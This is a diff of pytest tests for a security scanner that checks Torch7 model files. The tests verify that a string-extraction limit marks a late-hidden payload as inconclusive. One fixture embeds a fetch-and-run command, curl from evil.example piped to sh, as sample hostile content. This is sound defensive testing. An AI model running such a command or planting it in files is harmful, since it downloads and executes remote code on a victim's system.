@@ -185,6 +185,46 @@ def test_scan_bounded_torch7_window_is_inconclusive(tmp_path: Path) -> None:
     assert result.success is False
 
 
+def test_scan_string_extraction_limit_marks_late_torch7_payload_inconclusive(tmp_path: Path) -> None:
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\x00safe_fragment\x00"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\x00"
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="late-payload.t7")
+
+    result = Torch7Scanner(config={"torch7_max_extracted_strings": 2}).scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "torch7_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    budget_checks = [check for check in result.checks if check.name == "Torch7 Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.FAILED
+    assert budget_checks[0].details["analysis_incomplete"] is True
+
+    aggregate = core.scan_model_directory_or_file(
+        str(path),
+        torch7_max_extracted_strings=2,
+        cache_scan_results=False,
+    )
+    assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert core.determine_exit_code(aggregate) == 2
+
+
+def test_scan_string_extraction_exact_limit_preserves_clean_torch7_result(tmp_path: Path) -> None:
+    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\x00safe_fragment\x00"
+    path = _write_torch7_file(tmp_path, payload, filename="exact-limit.t7")
+
+    result = Torch7Scanner(config={"torch7_max_extracted_strings": 2}).scan(str(path))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    budget_checks = [check for check in result.checks if check.name == "Torch7 Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.PASSED
+    assert budget_checks[0].details["analysis_incomplete"] is False
+
+
 def test_regression_torch7_routes_to_dedicated_scanner(tmp_path: Path) -> None:
     payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
     path = _write_torch7_file(tmp_path, payload, filename="route.t7")
